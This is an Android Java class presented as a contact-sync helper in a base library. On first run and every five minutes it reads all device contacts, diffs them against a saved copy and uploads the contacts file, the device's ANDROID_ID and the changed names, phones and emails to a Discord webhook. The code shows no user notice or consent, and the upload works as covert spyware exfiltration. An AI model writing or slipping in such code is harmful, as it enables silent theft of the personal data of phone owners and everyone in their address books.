package com.application.baselibrary.core.contact;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import com.application.baselibrary.core.contact.model.Contact;
import com.application.baselibrary.network.DiscordWebhookClient;
import com.application.baselibrary.threading.scheduler.RxSchedulerProvider;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.io.*;
import java.lang.reflect.Type;
import java.util.*;

public class ContactSyncManager {

    private static final String TAG = "ContactSyncManager";
    private final ContactHelper helper;
    private final File oldFile;
    private final String webhookUrl;
    private final Gson gson = new Gson();

    public ContactSyncManager(Context context, String webhookUrl) {
        this.helper = new ContactHelper(context);
        this.oldFile = new File(context.getFilesDir(), "contacts.json"); // single file
        this.webhookUrl = webhookUrl;
    }

    public void start(Context context,String intervalTag){
        if(intervalTag.equals("Every5min")) {
            syncContacts(context);
            Log.i(TAG, "Contact sync triggered : "+intervalTag);
        }
        if(intervalTag.equals("FirstTime")) {
            syncContacts(context);
            Log.i(TAG, " Contact sync triggered : "+intervalTag);
        }
    }
    public void syncContacts(Context context) {
        RxSchedulerProvider.runOnIO(() -> {
            try {
                ensureFileExists(oldFile);
                // 1. Load old contacts from disk
                List<Contact> oldContacts = loadContacts(oldFile);

                // 2. Fetch fresh contacts directly from device
                List<Contact> newContacts = helper.fetchContacts();

                // 3. Compare old vs new
                String text = "";
                DiffResult diff = compare(oldContacts, newContacts);
                if(oldContacts.isEmpty()){
                    String currentJson = gson.toJson(newContacts);
                    try {
                        writeJsonToFile(oldFile, currentJson);
                        Log.i(TAG,"Since "+oldFile.getName()+" doesn't exist so made one");
                    } catch (IOException e) {
                        Log.e(TAG, "Failed to write contacts file", e);
                    }
                }
                if(diff.added.size() >5 || diff.removed.size() >5 || diff.updated.size() >5){
                    text = String.format(
                            "File Upload complete! Added: %s, Removed: %s, Updated: %s",
                            diff.added.size(), diff.removed.size(), diff.updated.size());
                }else{
                    text = String.format(
                            "File Upload complete! Added: %s, Removed: %s, Updated: %s",
                            diff.added.toString(), diff.removed.toString(), diff.updated.toString());
                }

                if (diff.hasChanges()) {
                    // 4. Upload old file if webhook is configured
                    if (webhookUrl != null && !webhookUrl.isEmpty()) {
                        final String finalText = text;
                        uploadToDiscord(context, oldFile, finalText, new Callback() {
                            @Override
                            public void onSuccess() {
                                // 5. Save fresh contacts into the single file
                                String currentJson = gson.toJson(newContacts);
                                try {
                                    writeJsonToFile(oldFile, currentJson);
                                } catch (IOException e) {
                                    Log.e(TAG, "Failed to write contacts file", e);
                                }
                                Log.i(TAG, finalText);
                            }

                            @Override
                            public void onError(String errorMessage) {
                                Log.i(TAG, finalText + "->  error :" +errorMessage);
                            }
                        });
                    }

                } else {
                    Log.i(TAG, "No changes detected, skipping sync.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error syncing contacts: " + e.getMessage());
            }

        });
    }

    private void ensureFileExists(File file) throws IOException {
        if (!file.exists()) {
            file.createNewFile();
            try (FileWriter writer = new FileWriter(file)) {
                writer.write("[]"); // initialize with empty JSON array
            }
            Log.i(TAG, "Created new contacts.json file at " + file.getAbsolutePath());
        }
    }


    private List<Contact> loadContacts(File file) throws IOException {
        if (!file.exists()) return new ArrayList<>();
        try (FileReader reader = new FileReader(file)) {
            Type listType = new TypeToken<List<Contact>>() {
            }.getType();
            return gson.fromJson(reader, listType);
        }
    }

    private void writeJsonToFile(File file, String json) throws IOException {
        try (FileWriter writer = new FileWriter(file)) {
            writer.write(json);
        }
    }

    private void uploadToDiscord(Context context, File file, String text, Callback callback) {
        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        DiscordWebhookClient handler = new DiscordWebhookClient(webhookUrl);
        handler.uploadFile(file, "Contact sync from device: " + androidId + text,
                new DiscordWebhookClient.WebhookCallback() {
                    @Override
                    public void onSuccess(DiscordWebhookClient.WebhookResponse responseResult) {
                        callback.onSuccess();
                        Log.i("ContactSyncManager", "Upload success: " + responseResult.success);
                    }

                    @Override
                    public void onError(String errorMessage) {
                        callback.onError(errorMessage);
                        Log.e("ContactSyncManager", "Upload failed: " + errorMessage);
                    }
                });
    }

    // DiffResult inner class
    public static class DiffResult {
        public List<Contact> added = new ArrayList<>();
        public List<Contact> removed = new ArrayList<>();
        public List<Contact> updated = new ArrayList<>();

        public boolean hasChanges() {
            return !added.isEmpty() || !removed.isEmpty() || !updated.isEmpty();
        }
    }

    private DiffResult compare(List<Contact> oldContacts, List<Contact> newContacts) {
        Map<String, Contact> oldMap = new HashMap<>();
        for (Contact c : oldContacts) oldMap.put(c.id, c);

        Map<String, Contact> newMap = new HashMap<>();
        for (Contact c : newContacts) newMap.put(c.id, c);

        DiffResult result = new DiffResult();

        for (Contact newC : newContacts) {
            Contact oldC = oldMap.get(newC.id);
            if (oldC == null) result.added.add(newC);
            else if (hasChanged(oldC, newC)) result.updated.add(newC);
        }

        for (Contact oldC : oldContacts) {
            if (!newMap.containsKey(oldC.id)) result.removed.add(oldC);
        }

        return result;
    }

    private boolean hasChanged(Contact oldC, Contact newC) {
        return newC.lastUpdated > oldC.lastUpdated
                || !Objects.equals(oldC.name, newC.name)
                || !Objects.equals(oldC.phones, newC.phones)
                || !Objects.equals(oldC.emails, newC.emails);
    }

    public interface Callback {
        void onSuccess();

        void onError(String errorMessage);
    }
}
